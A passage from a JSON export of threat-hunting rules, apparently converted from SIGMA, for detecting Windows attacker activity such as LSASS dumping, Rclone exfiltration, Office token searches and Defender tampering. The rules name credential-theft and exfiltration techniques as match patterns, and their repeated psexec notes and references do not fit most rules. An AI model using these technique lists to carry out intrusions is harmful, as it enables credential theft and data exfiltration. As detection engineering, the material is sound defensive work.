            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1016
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Obfuscated PowerShell Code",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"IAAtAGIAeABvAHIAIAAwAHgA\" or tgt.process.cmdline contains \"AALQBiAHgAbwByACAAMAB4A\" or tgt.process.cmdline contains \"gAC0AYgB4AG8AcgAgADAAeA\" or tgt.process.cmdline contains \"AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg\" or tgt.process.cmdline contains \"AuAEkAbgB2AG8AawBlACgAKQAgAHwAI\" or tgt.process.cmdline contains \"ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC\" or tgt.process.cmdline contains \"AHsAMQB9AHsAMAB9ACIAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADEAfQB7ADAAfQAiACAALQBmAC\" or tgt.process.cmdline contains \"AewAxAH0AewAwAH0AIgAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMAB9AHsAMwB9ACIAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADAAfQB7ADMAfQAiACAALQBmAC\" or tgt.process.cmdline contains \"AewAwAH0AewAzAH0AIgAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMgB9AHsAMAB9ACIAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADIAfQB7ADAAfQAiACAALQBmAC\" or tgt.process.cmdline contains \"AewAyAH0AewAwAH0AIgAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMQB9AHsAMAB9ACcAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADEAfQB7ADAAfQAnACAALQBmAC\" or tgt.process.cmdline contains \"AewAxAH0AewAwAH0AJwAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMAB9AHsAMwB9ACcAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADAAfQB7ADMAfQAnACAALQBmAC\" or tgt.process.cmdline contains \"AewAwAH0AewAzAH0AJwAgAC0AZgAg\" or tgt.process.cmdline contains \"AHsAMgB9AHsAMAB9ACcAIAAtAGYAI\" or tgt.process.cmdline contains \"B7ADIAfQB7ADAAfQAnACAALQBmAC\" or tgt.process.cmdline contains \"AewAyAH0AewAwAH0AJwAgAC0AZgAg\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1017
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1210"
            ],
            "name": "Suspicious SysAidServer Child",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\java.exe\" or src.process.image.path contains \"\\javaw.exe\") and src.process.cmdline contains \"SysAidServer\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1018
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process.\nThis way we are also able to catch cases in which the attacker has renamed the procdump executable.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "Potential LSASS Process Dump Via Procdump",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -ma \" or tgt.process.cmdline contains \" /ma \" or tgt.process.cmdline contains \" \u2013ma \" or tgt.process.cmdline contains \" \u2014ma \" or tgt.process.cmdline contains \" \u2015ma \") and tgt.process.cmdline contains \" ls\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1019
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts to remove Windows Defender configurations using the 'MpPreference' cmdlet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Tamper Windows Defender Remove-MpPreference",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Remove-MpPreference\" and (tgt.process.cmdline contains \"-ControlledFolderAccessProtectedFolders \" or tgt.process.cmdline contains \"-AttackSurfaceReductionRules_Ids \" or tgt.process.cmdline contains \"-AttackSurfaceReductionRules_Actions \" or tgt.process.cmdline contains \"-CheckForSignaturesBeforeRunningScan \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1020
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location\nAttackers can create a simple looking task in order to avoid detection on creation as it's often the most focused on\nInstead they modify the task after creation to include their malicious payload\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Modification Of Scheduled Tasks",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /Change \" and tgt.process.cmdline contains \" /TN \")) and (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"\\WINDOWS\\Temp\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Downloads\\\" or tgt.process.cmdline contains \"\\Temporary Internet\" or tgt.process.cmdline contains \"C:\\ProgramData\\\" or tgt.process.cmdline contains \"C:\\Perflogs\\\" or tgt.process.cmdline contains \"%ProgramData%\" or tgt.process.cmdline contains \"%appdata%\" or tgt.process.cmdline contains \"%comspec%\" or tgt.process.cmdline contains \"%localappdata%\") and (tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd /k \" or tgt.process.cmdline contains \"cmd /r \" or tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"certutil\" or tgt.process.cmdline contains \"bitsadmin\" or tgt.process.cmdline contains \"bash.exe\" or tgt.process.cmdline contains \"bash \" or tgt.process.cmdline contains \"scrcons\" or tgt.process.cmdline contains \"wmic \" or tgt.process.cmdline contains \"wmic.exe\" or tgt.process.cmdline contains \"forfiles\" or tgt.process.cmdline contains \"scriptrunner\" or tgt.process.cmdline contains \"hh.exe\" or tgt.process.cmdline contains \"hh \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1021
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may abuse msiexec.exe to proxy the execution of malicious payloads",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious MsiExec Embedding Parent",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (src.process.cmdline contains \"MsiExec.exe\" and src.process.cmdline contains \"-Embedding \")) and (not ((tgt.process.image.path contains \":\\Windows\\System32\\cmd.exe\" and tgt.process.cmdline contains \"C:\\Program Files\\SplunkUniversalForwarder\\bin\\\") or (tgt.process.cmdline contains \"\\DismFoDInstall.cmd\" or (src.process.cmdline contains \"\\MsiExec.exe -Embedding \" and src.process.cmdline contains \"Global\\MSI0000\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1022
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1202"
            ],
            "name": "Outlook EnableUnsafeClientMailRules Setting Enabled",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"\\Outlook\\Security\\EnableUnsafeClientMailRules\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1023
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious program execution in Outlook temp folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566"
            ],
            "name": "Suspicious Execution From Outlook Temporary Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\Temporary Internet Files\\Content.Outlook\\\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1024
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1567"
            ],
            "name": "PUA - Rclone Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"--config \" and tgt.process.cmdline contains \"--no-check-certificate \" and tgt.process.cmdline contains \" copy \") or ((tgt.process.image.path contains \"\\rclone.exe\" or tgt.process.displayName=\"Rsync for cloud storage\") and (tgt.process.cmdline contains \"pass\" or tgt.process.cmdline contains \"user\" or tgt.process.cmdline contains \"copy\" or tgt.process.cmdline contains \"sync\" or tgt.process.cmdline contains \"config\" or tgt.process.cmdline contains \"lsd\" or tgt.process.cmdline contains \"remote\" or tgt.process.cmdline contains \"ls\" or tgt.process.cmdline contains \"mega\" or tgt.process.cmdline contains \"pcloud\" or tgt.process.cmdline contains \"ftp\" or tgt.process.cmdline contains \"ignore-existing\" or tgt.process.cmdline contains \"auto-confirm\" or tgt.process.cmdline contains \"transfers\" or tgt.process.cmdline contains \"multi-thread-streams\" or tgt.process.cmdline contains \"no-check-certificate \")))) | columns tgt.process.cmdline,src.process.cmdline,Details",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1025
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects possible search for office tokens via CLI by looking for the string \"eyJ0eX\". This string is used as an anchor to look for the start of the JWT token used by office and similar apps.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1528"
            ],
            "name": "Suspicious Office Token Search Via CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"eyJ0eXAiOi\" or tgt.process.cmdline contains \" eyJ0eX\" or tgt.process.cmdline contains \" \\\"eyJ0eX\\\"\" or tgt.process.cmdline contains \" 'eyJ0eX'\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1026
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects wscript/cscript executions of scripts located in user directories",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059"
            ],
            "name": "Potential Dropper Script Execution Via WScript/CScript",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\") and (tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Tmp\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\") and (tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".jse\" or tgt.process.cmdline contains \".vba\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\" or tgt.process.cmdline contains \".wsf\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1027
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious parent processes that should not have any children or should only have a single possible child program",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Process Parents",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\minesweeper.exe\" or src.process.image.path contains \"\\winver.exe\" or src.process.image.path contains \"\\bitsadmin.exe\") or ((src.process.image.path contains \"\\csrss.exe\" or src.process.image.path contains \"\\certutil.exe\" or src.process.image.path contains \"\\eventvwr.exe\" or src.process.image.path contains \"\\calc.exe\" or src.process.image.path contains \"\\notepad.exe\") and (not ((tgt.process.image.path contains \"\\WerFault.exe\" or tgt.process.image.path contains \"\\wermgr.exe\" or tgt.process.image.path contains \"\\conhost.exe\" or tgt.process.image.path contains \"\\mmc.exe\" or tgt.process.image.path contains \"\\win32calc.exe\" or tgt.process.image.path contains \"\\notepad.exe\") or not (tgt.process.image.path matches \"\\.*\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1028
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Jlaive to execute assemblies in a copied PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "HackTool - Jlaive In-Memory Assembly Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" and src.process.cmdline contains \".bat\") and ((tgt.process.image.path contains \"\\xcopy.exe\" and (tgt.process.cmdline contains \"powershell.exe\" and tgt.process.cmdline contains \".bat.exe\")) or (tgt.process.image.path contains \"\\xcopy.exe\" and (tgt.process.cmdline contains \"pwsh.exe\" and tgt.process.cmdline contains \".bat.exe\")) or (tgt.process.image.path contains \"\\attrib.exe\" and (tgt.process.cmdline contains \"+s\" and tgt.process.cmdline contains \"+h\" and tgt.process.cmdline contains \".bat.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1029
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Rundll32 Setupapi.dll Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\runonce.exe\" and src.process.image.path contains \"\\rundll32.exe\" and (src.process.cmdline contains \"setupapi.dll\" and src.process.cmdline contains \"InstallHinfSection\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1030
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Splwow64.exe process without any command line parameters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Suspicious Splwow64 Without Params",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
